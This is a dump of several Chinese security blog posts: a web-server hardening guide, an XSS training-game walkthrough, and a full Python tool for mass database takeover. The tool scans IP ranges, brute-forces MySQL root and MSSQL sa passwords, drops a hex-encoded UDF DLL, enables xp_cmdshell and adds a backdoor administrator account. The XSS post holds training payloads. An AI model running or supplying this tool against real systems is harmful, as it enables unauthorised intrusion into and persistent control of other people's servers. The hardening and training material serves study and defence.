&quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;aaa&quot;&gt; Order Deny,Allow Deny from all Allow from 192.168.1.111 &lt;&#x2F;Directory&gt; 6、配置httpd.conf限制一些文件类型的访问，如txt的日志 &lt;Files ~ &quot;.txt$&quot;&gt; Order allow,deny Deny from all &lt;&#x2F;Files&gt; 7、针对URL相对路径的禁止访问： &lt;Location &#x2F;dir&#x2F;&gt; Order allow,deny Deny from all &lt;&#x2F;Location&gt; Nginx 安全配置nginx 工作原理Nginx由内核和模块组成，nginx核心模块包括：HTTP模块、EVENT模块和MAIL模块。nginx仅仅通过查找配置文件将客户端请求映射到一个location block（location是Nginx配置中的一个指令，用于URL匹配），而在这个location中所配置的每个指令将会启动不同的模块去完成相应的工作。nginx架构类似于Apache的Worker工作状态，Nginx的每一个Worker进程都管理着大量的线程，真正处理请求的是Worker之下的线程。 nginx本身不能处理PHP，它只是个web服务器，当接收到请求后，如果是php请求，则发给php解释器处理，并把结果返回给客户端。nginx一般是把请求发fastcgi管理进程处理，fastcgi管理进程选择cgi子进程处理结果并返回被nginx。 nginx涉及到两个账户，一个是nginx的运行账户，一个是php-fpm的运行账户。如果访问的是一个静态文件，则只需要nginx的运行账户对文件具有读取权限；而如果访问的是一个php文件，则首先需要nginx的运行账户对文件有读取权限，读取到文件后发现是一个php文件，则转发给php-fpm，此时则需要php-fpm账户对文件具有读取权限。 nginx 在centos下的安全配置 nginx设置问题 #隐藏 Nginx 的版本号，提高安全性。 server_tokens off; #开启高效文件传输模式，sendfile 指令指定 Nginx 是否调用sendfile 函数来输出文件，对于普通应用设为 on，如果用来进行下载等应用磁盘 IO 重负载应用，可设置为 off，以平衡磁盘与网络 I&#x2F;O 处理速度，降低系统的负载。 sendfile on; #是否开启目录列表访问，默认关闭。 autoindex off; 开头的配置 user www-data; &#x2F;&#x2F;用户和组 worker_processes auto; &#x2F;&#x2F;进程数 pid &#x2F;run&#x2F;nginx.pid; &#x2F;&#x2F;进程文件 include &#x2F;etc&#x2F;nginx&#x2F;modules-enabled&#x2F;*.conf; &#x2F;&#x2F;导入其他配置文件到nginx配置文件 events配置 events &#123; worker_connections 768; &#x2F;&#x2F;设置一个worker进程同时打开的最大连接数 # multi_accept on; &#x2F;&#x2F;告诉nginx收到一个新连接通知后接受尽可能多的连接 &#125; http配置 http &#123; ## # Basic Settings ## sendfile on; &#x2F;&#x2F;开启高效文件传输模式 tcp_nopush on; &#x2F;&#x2F;告诉 Nginx 在一个数据包里发送所有头文件 tcp_nodelay on; &#x2F;&#x2F;告诉 Nginx 不要缓存数据，而是一段一段的发送 keepalive_timeout 65; &#x2F;&#x2F;连接超时时间，单位是秒 types_hash_max_size 2048; &#x2F;&#x2F;上传文件大小限制 # server_tokens off; &#x2F;&#x2F;隐藏 Nginx 的版本号 # server_names_hash_bucket_size 64; # server_name_in_redirect off; include &#x2F;etc&#x2F;nginx&#x2F;mime.types; &#x2F;&#x2F;包含配置 default_type application&#x2F;octet-stream; &#x2F;&#x2F;默认传输类型 ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log; &#x2F;&#x2F;访问日志 error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log; &#x2F;&#x2F;错误日志 ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text&#x2F;plain text&#x2F;css application&#x2F;json application&#x2F;javascript text&#x2F;xml application&#x2F;xml application&#x2F;xml+rss text&#x2F;javascript; ## # Virtual Host Configs ## include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf; include &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;*; &#125; server配置 众所周知，Nginx的配置文件分为Server、Location、If等一些配置块，并且存在包含关系，和编程语言比较类似。如果在外层配置的一些选项，是可以被继承到内层的。 但这里的继承也有一些特性，比如add_header，子块中配置后将会覆盖父块中的add_header添加的所有HTTP头，造成一些安全隐患。 server配置在一些系统上不是默认的nginx配置，如果需要修改可以在nginx配置中添加，或者添加include，包含进其他的自定义server。 如下列代码，Server块添加了CSP头： server &#123; ... add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;; add_header X-Frame-Options DENY; location &#x3D; &#x2F;test &#123; add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ &#x2F;xss.html break; &#125; &#125; 但/test的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效。 禁止一个目录的访问示例：禁止访问path目录 location ^~ &#x2F;path &#123; deny all; &#125; 可以把path换成实际需要的目录，目录path后是否带有”/“，带“/”会禁止访问该目录和该目录下所有文件。不带”/“的情况就有些复杂了，只要目录开头匹配上那个关键字就会禁止；注意要放在fastcgi配置之前。 这个常见于Nginx做反向代理的情况，动态的部分被proxy_pass传递给后端端口，而静态文件需要Nginx来处理。 假设静态文件存储在/home/目录下，而该目录在url中名字为files，那么就需要用alias设置目录的别名： location &#x2F;files &#123; alias &#x2F;home&#x2F;; &#125; 此时，访问http://example.com/files/readme.txt，就可以获取/home/readme.txt文件。 但我们注意到，url上/files没有加后缀/，而alias设置的/home/是有后缀/的，这个/就导致我们可以从/home/目录穿越到他的上层目录。从而导致一个目录穿越问题。 禁止php文件的访问及执行 示例：去掉单个目录的PHP执行权限 location ~ &#x2F;attachments&#x2F;.*\\.(php|php5)?$ &#123; deny all; &#125; 示例：去掉多个目录的PHP执行权限 location ~ &#x2F;(attachments|upload)&#x2F;.*\\.(php|php5)?$ &#123; deny all; &#125; 禁止IP的访问 示例：禁止IP段的写法： deny 10.0.0.0&#x2F;24; 示例：只允许某个IP或某个IP段用户访问，其它的用户全都禁止 allow x.x.x.x; allow 10.0.0.0&#x2F;24; deny all; 禁用非必要的方法 if ($request_method !~ ^(GET|HEAD|POST)$ ) &#123; return 444; &#125; 禁用扩展名 location ~* .(txt|doc|sql|gz|svn|git)$ &#123; deny all; &#125; 根据用户的真实 IP 做连接限制 ## 这里取得原始用户的IP地址 map $http_x_forwarded_for $clientRealIp &#123; &quot;&quot; $remote_addr; ~^(?P&lt;firstAddr&gt;[0-9\\.]+),?.*$ $firstAddr; &#125; ## 针对原始用户 IP 地址做限制 limit_conn_zone $clientRealIp zone&#x3D;TotalConnLimitZone:20m ; limit_conn TotalConnLimitZone 50; limit_conn_log_level notice; ## 针对原始用户 IP 地址做限制 limit_req_zone $clientRealIp zone&#x3D;ConnLimitZone:20m rate&#x3D;10r&#x2F;s; #limit_req zone&#x3D;ConnLimitZone burst&#x3D;10 nodelay; limit_req_log_level notice; 参考资料： https://www.cnblogs.com/chenpingzhao/p/5785416.html https://wooyun.kieran.top/#!/drops/201.Nginx%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E7%A0%94%E7%A9%B6 https://wooyun.kieran.top/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE https://blog.csdn.net/yf3585595511/article/details/54933646","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"XSS GAME记录","slug":"XSS-GAME记录","date":"2018-10-05T12:05:20.000Z","updated":"2019-03-12T02:43:55.000Z","comments":true,"path":"2018/10/XSS-GAME记录/","link":"","permalink":"https://misakikata.github.io/2018/10/XSS-GAME%E8%AE%B0%E5%BD%95/","excerpt":"","text":"在安全文摘上看到一篇前端安全的文章，最后提到了几个xss在线游戏，有两个是之前就见过的，一个没玩过，好像也是之前的xss游戏。 文章地址：https://segmentfault.com/a/1190000016551188 首先看第一关，此网站需要科学上网。 https://xss-game.appspot.com/level1 页面可以看到所用的html代码和js，以及后端的py代码，简单尝试一下，可以发现是写入页面。 并且从code中可以看到，没有过滤，直接 &lt;script&gt;alert(2)&lt;&#x2F;script&gt; 第二关，留言框，post提交数据，直接插入图片。 &lt;img src&#x3D;@ onerror&#x3D;alert(2)&gt; 第三关，从链接猜测是锚点xss，尝试修改锚点，发现写入页面。 但是尝试后发现，并不是直接写入如上图所示页面那么简单，而是写入了img标签 查看其中的js代码，然后使用如下payload即可。 &#39; onerror&#x3D;alert(2) &#39; 第四关，点击页面按钮后显示如下，猜测是在timer的xss，查看页面代码。 在timer.html页面下可以发现如下代码，基本可以断定是写入img标签的xss，直接使用onload事件，使用连字符直接alert()。 &#39;-alert(2)-&#39; 第五关，访问后是一个登陆后的页面，这里我们先退出页面。 sign up后可以看到，有输入email的地方，和next两个参数输入点，一开始以为是输入框的问题，尝试多次发现没有写入页面。 然后再signup.html页面下发现如下内容 初步判断是next参数的问题，也就是next写入img标签，尝试如下，必须点击next，一开始点击GO，一直没触发。 javascript:alert(2)","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"批量获取数据库权限","slug":"批量获取数据库权限","date":"2018-09-28T02:05:11.000Z","updated":"2018-09-28T10:55:57.000Z","comments":true,"path":"2018/09/批量获取数据库权限/","link":"","permalink":"https://misakikata.github.io/2018/09/%E6%89%B9%E9%87%8F%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9D%83%E9%99%90/","excerpt":"","text":"眼看要到十一国庆小长假了，打算长假前写篇文章，巧合看到一篇老博文，dub ZJ居然要价七千，所以干脆写一个数据库ZJ脚本。 利用以下几点： 获取3306端口是否开放，开放后猜测root密码，密码猜测成功后，执行写入udf.dll，利用udf添加账号密码 。 获取1433端口是否开放，开放后猜测sa密码，密码猜测成功后，执行xp_cmdshell，2005以上就默认关闭了，获取sa权限之后重新开启，但还是需要在2008之前，利用xp_cmdshell写入远程账号密码。不过当用户已AUTHORITY\\NetworkService登陆时时（mssql2005express版默认）无法执行net user命令添加用户。只考虑了开启或者关闭xp_cmdshell的情况，删除的话暂不处理。 以上只针对Windows系统，数据库版本不高。 之所以采用这两种形式，一旦可以写入的话，即便没开启远程桌面，也可以利用udf或者xp_cmdshell开启远程桌面。 本地需要ip.txt 写入测试的IP网段，成功的会写入本地mysql，或者mssql 的txt文件。 如此，直接上代码，本地测试mysql没发现问题，如有考虑不周的或者认识错误的请告知。 #coding:utf-8 import MySQLdb import pymssql import IPy import threading import Queue import socket import binascii class thread(threading.Thread): def __init__(self,queue): threading.Thread.__init__(self) self._queue &#x3D; queue def run(self): while not self._queue.empty(): queue &#x3D; self._queue.get(timeout&#x3D;0.5) try: sock &#x3D; socket.socket() sock.settimeout(2) try: sock.connect((queue, 3306)) print u&quot;检测到&quot; + queue + u&quot;:3306端口开放，测试中。。。&quot; self.mysql(queue) except: print queue + u&#39;:3306 端口关闭&#39; try: sock.connect((queue, 1433)) print u&quot;检测到&quot; + queue + u&quot;:1433端口开放，测试中。。。&quot; self.mssql(queue) except: print queue + u&#39;:1433 端口关闭&#39; except: continue def mysql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file &#x3D; f.readlines() for mm in file: try: db &#x3D; MySQLdb.connect(queue, &quot;root&quot;, mm.strip(&#39;\\n&#39;), &quot;mysql&quot;, connect_timeout&#x3D;2) print u&quot;爆破%s:3306端口成功，账号密码为: root&#x2F;%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor &#x3D; db.cursor() cursor.execute(&quot;SELECT VERSION()&quot;) data &#x3D; cursor.fetchone() udf &#x3D; binascii.a2b_hex(&quot;4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000F80000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A24000000000000004D477BD0092615830926158309261583005E86830B261583005E808308261583005E968307261583005E91830B2615832EE06E830A2615830926148325261583005E9C8308261583005E878308261583005E8483082615835269636809261583000000000000000000000000000000000000000000000000504500004C0103004AFE9F5A0000000000000000E00002210B010900001000000010000000600000607C0000007000000080000000000010001000000002000005000000000000000500000000000000009000000010000000000000020000000000100000100000000010000010000000000000100000007C83000008020000B4820000C800000000800000B402000000000000000000000000000000000000848500001000000000000000000000000000000000000000000000000000000000000000000000002C7E00004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000555058300000000000600000001000000000000000040000000000000000000000000000800000E0555058310000000000100000007000000010000000040000000000000000000000000000400000E02E7273726300000000100000008000000006000000140000000000000000000000000000400000C00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000332E393100555058210D090208B92BCF11B11CEEA24F550000560C000000220000260000A8FFFFFFFF8B4C240833C03901741656578B7C24146A0C59BE000010DCF3A566A55FB0015E5DFB77FBC38B44240C1A6A071611108BF8183218FF63DB6F1CA45FC7011E1200210883380175128B40040DF6776F0700750A1004C6000132C0C3530ABF1DF68D3C3053A454082D08FF30FF15FFF6EE776C885985C075085614C601011BC8568D71018A11FD6FDFFE4184D275F98B54142BCE890A32558BEC8B4D0C833902B7D860BF5374148B7D10915C5453EB4CBF9DBDDF8B417D740F1B707C1BEBE5836004DBB1FFB7001A0C8B48048B008D4401025072A0594C08DFC8D7B5891678113006A44CEB6C57BEB7B2B85F5E5DA30421740833DBB63FF6A8591353568B742410D878534602DB85DB5BB6460851C78D5C4257E8240B75EEEEBFE01400C604070008FF70041E0553B1DB1B921A22C418535720030054090F09B7086A995B0F98599954CF2D343713B8F4540B1EDEB60D818403552251519D35DFFED6FEDF576800F762D66A018945FC068BF08B4560DD7FF70CC606004533FF595939387471683CC071C6FEDFDA9C12260C3BC7745B506A04FF75FC149073E1EDD7A9FD48533AFC8D48911040B963DBFF2BC18BD88D043B505630F8268C5330D8AD8DBD5F03FE570E940DE57DF8463FE6364C2066BA5B1810A4803E0059169EB0FF741A8BC6C64437FF00594D1489C906987BEBD86F183E5F205EC9C3EED7B235DCBAF37D574708C45030087BDBDACDC9C26A4078C710548D4601B9E07E614251724F0856FF31CF6BAFDD9DB694C66AFF8DC32082F63A58B0B6030D092C23005F7CC36E57036C6A081D1290AC0AA88365FC2F6C2F2C2D4592D0EB071B408F65E8C70BBFD66E42FEFF000D1FEDC25E3BFFDB17B60D08209A02F3C3E90806F58BFF56688000002D8C6D675880985608845AA3BDE0FEBB062358045485F675054DAA83260076FBB7DB4508C36F08ED09ACC704240607FF0B4C113637598D71FFCF9C0BBF77DFC9750E39056B107E3CFF7310830B01FBEEC6BB8B0910548B098F57890A23480F85D47D618CBBAD641718068B79040838071B76EDEEBB1E50EB184AA705B8E61768B0B030D8E803A83C0957C1D6BBAEB5D6A1E7E9E2573CA12F4C6A6FF777C3025EFD096A1FEE76EB3CAA10C80475ED7BEFC0C7051F281A70E027071BDFF79D5CB520BC04B81B6A5635B952EB782B7339B2E3696FF7DEFD7340393D155C741C68062809AC43DB6B85850D9E1034252316FFE666F862F154B201DC0801592CC2B1A1DB78049DDFDBF62413D90FD4FC83F80266B16F6CB0D2595BFFA0584B77783BB5783106350F8487C71996EE4CD3543BF81810897D82EFC796BE35FAC87251833F8AF36A7C398587B4F10774E9FFC8D60F7C89C5DB9BB5D955F85615441B474DED5BE38EF88A394D1003D00874B48909437AA36D020C1AD3F8EBA71C3162CC5A64442E386161FB0A58064C32FC19503F1BDF720443375BC9C20CC710FB02231FB2288B2EF28B5D081CAE0FDB9B54E433C95CFC7D2008016C2DC6C23BF15A393A4417E4D61BFE7FAFAE3BF0740583FE02752E1910D03BC1E7166EB8ED57565FD03B5EE40003937B703B67115A039614168012376C7D270A8227FEA0246420575062B30D661327002F527F8DF61AD2061153F76A037543B067BB614F34032168742E2C0D2C3CEC257FEB1B71EC5A09706A7C6FAAE05051597C64825D900EADF62FFA8A19066B8F91B6C72AE490C396EC1640E134A9FF3B246ABB41C1F17926547DBC550C0D381E33BC05BC595D382281EC2832F7869F365F212043211C895E2118891D05F78EC243143C21A2AA210C668C186C5FFBDA3806252C0620080605DD2DCDD20425002D7FFC9C8F7AB6B1F6143095562407042831D6FEDB7F0807348B85E0FCA0AA701DDBB5B395011C1920241318092B18476A565F201CB360C32C9F7B8985D8320A04DC03B557E01B243468DEDFD1F7D8D360CE2879D40A2C833D208DBDC3DA00F923685B1B300BDFAF67F534C97F23401EC25F6A4849918F144A50152E9DF458AAF8A29C10F3EB67611C7E052C37D4598FEDED8321B9273551E0F5EE3BDC0ABF03E4507F4B8417185BDB7E600BCE1CDC142CD6E288B154B609E01B14F413160A4BDB313DDCDBFFDC84676CC859D94E1E07F7D81BF076BBB7C00359485D1656B8BC18BE04A3638B6F2AF83BC673080753025073D85F60835A3BFE72F15F5E25206C6053C820CC006F35B4DD452BB84D5A346627040B85BF2B5E6E413C03C1813850E45FEFA5ECFFFB33D2B90B011C48180F94C28BC25DC33FB702BF35E34831C80FB74114AE057106C1A55B6C33578C081817761BFFFF2FF1D7487BF972098B580803D93BFB720A4283C0283BD67270CA36B5E86AE55DC38F6AFEF0CD71F7A970040B056418005083EC080DB7C670082F316C33C576F0852F06DF64A31A89B90968555DB7F081F0B2091C6B04F555972DD12C937D1350195C083B04E1C26F2724C1E81FF715E0018FEFB6532B034F230059948BE55DC3621DDB49A301CA3DAFC0FAE99525242631CCFF29343232B61058054C50AC2CB41E97AF12B60D56096B27D7616B20CFB0FBEF2AE4E03160031F73D9665B9A6C038D2BE0FAFC046BA039F13CB4FC8A0D6C120C7D0DC395C3C1619C965154147FE41F3E783124F020140BDAC40E5643B25D53EC1068F885626DF4F888C9BF4EE640BB25EEA0398466820D85C33149DB9F0A359A04EB605675F869639FC1F6448B7598751F1033F0071476E6CA20189D271CB4F6EE6FEDF4330C113BF77507BE4F59EB0B85F30A7B047EA10AC1E0100BF0CE00F7D6076C840D1E045E5F01C33F5C05646464646064686C1405766474B000003FF4C20E034B0F20185F4E6F20FFFFB7FF617267756D656E7473096C6C6F77656420287564663A206C69625F6DCCFD6DF77973716C0D5F73085F696E666F293918DFB6FF8F2076657273696F6E20302E01341F45787065F6DBDBDD637447657861076C79201A65207374723F5BDB5AFB672074791B75726171217258C00E602B7477911FD86F030B3F8672206E616D48DBB1B71F436F756C246E6F74C4636113203058B76D186D2779AF72F1483FDA4D943F2003121071051BF29D5860214707D0604D0D0B0F81CB074ED961DD9703AB17CC2708A77527ECC00FD81F0A3B034FC0A07B851F03240328C1556583A200C5889251CA22D877BDB119BF44FF000F5565A3AA00A8AA9251645455C95532AAAAFFF61D455C0410020157616974466F00FC06C07253886C654F626A07C07F6B99145669727475616C417603E0F6370D536574456E76126F6EC000BC6DBF5661726961622B4118437265F76DEB6E94546806640D47264375727222CD12F65B502A636573734914266E03E083135469636BDE6E6BB1F6B6FD5175657279500366846D616E371667EF1B00FD0144697367374CFDB7EDED6962727879436192731A4973446562756767EDEE6DAD266A686546A4556E6840B1B7B7B7643164457846707469AF46696C4A6D295B6119B41254DE64AEB0176D0DD8114990B9EDD61A0A6B409D6D70876547C25A73CD517F77555122B4ED6E591B5C537973186DEEC3C2EB2E39417373650975697CDB15DA434C7D5F687E396D5F2EDFFEDEBE5F616D7367087869740B646A753A5F666469EC4217B076260A639A5F64FD6CADB91F5F686F6F6B131459725FF802700148D15FDB9CEB0249730A330A6C21D6F0BD82539C2A64D46E640893050B130F651E6B5B7BC25F2C723456ED6D1C182FF6D69A700A035F706F522947E1DDBE6E106468756C5EB92A6BCB92BD9B1B2CA806E0B6D86E6EC57265250866112E827BDB5673749C637079082439EDCD5C6B32C06E4D0FD7ED1F5AC36F7319663A1F5F4370705831C75E3B8474BC6D343F001817FFFFFFFF3D193C1C1B161E55142D16270815270F11115F10130A070D2E17090705160C1E7FFBFFFF080A0B160918181505061B050C10060717062105110F061421110B08E4FBDFB62B22052A111D0D18532D483806000776FBDBE5080C09330A090B0C051007061612EEDFFEED0E0B34150B18160D3D0542C205121E14066930FFD8DDFF110C0E1D4D0517230D0C3224080B4506F0DE041004F03B0A6EFF2C01043808041C1C0204003E4C016DFF21FD05004AFE9F5A8FE00002210B0109080C634F7AD60C1213D616A300200E10C10A01630B02AB3362B7EE6107006003040233351EEED9C0CE34100706C02633D6EDDB7620AC22033C144002B0021C5759DD0050520143C8C8BA65B1214200A7B82F06DB5D182EB4787407EA0B900C5BFA90CDB742602E72647D610861C90E76C508FB0A00C700A1DB66BB77402E26300304301BECDB943D001A27C04F73726300EB11C0061B40731C4F78C2C2A365761F01030002ED7760497B27421BA023030000EDD8D152127C53030400000000000080FF00000000000000000000807C2408010F85B901000060BE007000108DBE00A0FFFF5783CDFFEB0D9090908A064688074701DB75078B1E83EEFC11DB72EDB80100000001DB75078B1E83EEFC11DB11C001DB73EF75098B1E83EEFC11DB73E431C983E803720DC1E0088A064683F0FF747489C501DB75078B1E83EEFC11DB11C901DB75078B1E83EEFC11DB11C975204101DB75078B1E83EEFC11DB11C901DB73EF75098B1E83EEFC11DB73E483C10281FD00F3FFFF83D1018D142F83FDFC760F8A02428807474975F7E963FFFFFF908B0283C204890783C70483E90477F101CFE94CFFFFFF5E89F7B92A0000008A07472CE83C0177F7803F0075F28B078A5F0466C1E808C1C01086C429F880EBE801F0890783C70588D8E2D98DBE005000008B0709C0743C8B5F048D8430B472000001F35083C708FF96F0720000958A074708C074DC89F95748F2AE55FF96F472000009C07407890383C304EBE16131C0C20C0083C7048D5EFC31C08A074709C074223CEF771101C38B0386C4C1C01086C401F08903EBE2240FC1E010668B0783C702EBE28BAEF87200008DBE00F0FFFFBB0010000050546A045357FFD58D871702000080207F8060287F585054505357FFD558618D4424806A0039C475FA83EC80E9AD98FFFF0000004800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000030001010220010010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000040000000000010018000000180000800000000000000000040000000000010002000000300000800000000000000000040000000000010009040000480000005C80000056020000E404000000000000584000003C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C656765733E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365223E3C2F726571756573746564457865637574696F6E4C6576656C3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A20203C646570656E64656E63793E0D0A202020203C646570656E64656E74417373656D626C793E0D0A2020202020203C617373656D626C794964656E7469747920747970653D2277696E333222206E616D653D224D6963726F736F66742E564339302E435254222076657273696F6E3D22392E302E32313032322E38222070726F636573736F724172636869746563747572653D2278383622207075626C69634B6579546F6B656E3D2231666338623362396131653138653362223E3C2F617373656D626C794964656E746974793E0D0A202020203C2F646570656E64656E74417373656D626C793E0D0A20203C2F646570656E64656E63793E0D0A3C2F617373656D626C793E504100000000000000000000000010830000F08200000000000000000000000000001D83000008830000000000000000000000000000000000000000000028830000368300004683000056830000648300000000000072830000000000004B45524E454C33322E444C4C004D5356435239302E646C6C00004C6F61644C69627261727941000047657450726F634164647265737300005669727475616C50726F7465637400005669727475616C416C6C6F6300005669727475616C467265650000006672656500000000000000004AFE9F5A0000000058840000010000001200000012000000A4830000EC8300003484000021100000A312000000100000A4120000A3120000A0120000CC110000A31200009811000086110000A31200009811000076100000A3120000431000002E1100001A110000A91000006D84000083840000A0840000BB840000C7840000DA840000EB840000F484000004850000128500001B8500002B8500003985000041850000508500005D850000658500007485000000000100020003000400050006000700080009000A000B000C000D000E000F00100011006C69625F6D7973716C7564665F7379732E646C6C006C69625F6D7973716C7564665F7379735F696E666F006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F5F696E6974007379735F62696E6576616C007379735F62696E6576616C5F6465696E6974007379735F62696E6576616C5F696E6974007379735F6576616C007379735F6576616C5F6465696E6974007379735F6576616C5F696E6974007379735F65786563007379735F657865635F6465696E6974007379735F657865635F696E6974007379735F676574007379735F6765745F6465696E6974007379735F6765745F696E6974007379735F736574007379735F7365745F6465696E6974007379735F7365745F696E69740000000000700000100000006D3C683E6C3E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;) if (data[0][0] &lt; 5) or ((data[0][0] &#x3D;&#x3D; 5) and (data[0][2] &lt;&#x3D; 1)): try: basedir &#x3D; &quot;select &#39;%s&#39; into dumpfile &#39;c:\\\\windows\\\\system32\\\\udf.dll&#39;;&quot; %udf cursor.execute(basedir) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait &#x2F;add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait &#x2F;add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root&#x2F;%s, 远程桌面账号密码为 wait&#x2F;wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait&#x2F;wait&quot; except: print u&quot;udf执行失败&quot; else: try: cursor.execute(&quot;select @@basedir;&quot;) dir &#x3D; cursor.fetchone() basedir1 &#x3D; &quot;select &#39;plugin&#39; into dumpfile &#39;%s&#39;;&quot; %(dir[0]+&quot;lib&#x2F;plugin::$INDEX_ALLOCATION&quot;) basedir2 &#x3D; &quot;select &#39;%s&#39; into dumpfile &#39;%s&#39;;&quot; %(udf, dir[0]+&quot;lib&#x2F;plugin&#x2F;udf.dll&quot;) cursor.execute(basedir1) cursor.execute(basedir2) cursor.execute(&quot;create function sys_eval returns string soname &#39;udf.dll&#39;;&quot;) cursor.execute(&quot;select cmdshell(&#39;net user wait wait &#x2F;add&#39;);&quot;) cursor.execute(&quot;select cmdshell(&#39;net localgroup administrators wait &#x2F;add&#39;);&quot;) with open(&quot;mysql.txt&quot;, &#39;a&#39;) as fs: fs.write(queue + u&quot;:3306 账号密码为 root&#x2F;%s, 远程桌面账号密码为 wait&#x2F;wait&quot;+&#39;\\n&#39;) % mm print queue + u&quot; udf 创建成功生成远程账号密码为：wait&#x2F;wait&quot; except: print u&quot;udf执行失败&quot; db.close() break except: continue def mssql(self,queue): with open(&#39;mm.txt&#39;,&#39;r&#39;) as f: file &#x3D; f.readlines() for mm in file: try: db &#x3D; pymssql.connect(host&#x3D;queue, user&#x3D;&quot;sa&quot;, password&#x3D;mm.strip(&#39;\\n&#39;), database&#x3D;&quot;master&quot;, connect_timeout&#x3D;2) print u&quot;爆破%s:1433端口成功，账号密码为: sa&#x2F;%s&quot; %(queue, mm.strip(&#39;\\n&#39;)) cursor &#x3D; db.cursor() try: cursor.execute(&quot;exec master..xp_cmdshell &#39;whoami&#39;;&quot;) except: cursor.execute(&quot;EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;&quot;) try: cursor.execute(&quot;exec master..xp_cmdshell &#39;net user wait wait &#x2F;add&#39;;&quot;) cursor.execute(&quot;exec master..xp_cmdshell &#39;net user administrators wait &#x2F;add&#39;;&quot;) with open(&quot;mssql.txt&quot;,&#39;a&#39;) as fs: fs.write(queue+&quot;:1433 账号密码为 sa&#x2F;%s, 远程桌面账号密码为 wait&#x2F;wait&quot;+&#39;\\n&#39;) % mm.strip(&#39;\\n&#39;) except: print queue + u&quot; xp_cmdshell 执行失败&quot; db.close() except: continue def main(): queue &#x3D; Queue.Queue() threads &#x3D; [] with open(&quot;ip.txt&quot;) as f: file &#x3D; f.readlines() for i in file: ip &#x3D; i.strip(&#39;\\n&#39;) for x in IPy.IP(ip): queue.put(x) for i in xrange(1): threads.append(thread(queue)) for i in threads: i.start() for i in threads: i.join() if __name__ &#x3D;&#x3D; &quot;__main__&quot;: main()","categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://misakikata.github.io/tags/python/"}]},{"title":"基于scrapy的备份文件扫描","slug":"基于scrapy的备份文件扫描","date":"2018-09-27T02:51:38.000Z","updated":"2018-09-27T03:12:06.000Z","comments":true,"path":"2018/09/基于scrapy的备份文件扫描/","link":"","permalink":"https://misakikata.github.io/2018/09/%E5%9F%BA%E4%BA%8Escrapy%E7%9A%84%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E6%89%AB%E6%8F%8F/","excerpt":"","text":"Scrapy，Python开发的一个快速、高层次的屏幕抓取和web抓取框架，用于抓取web站点并从页面中提取结构化的数据。Scrapy用途广泛，可以用于数据挖掘、监测和自动测试。 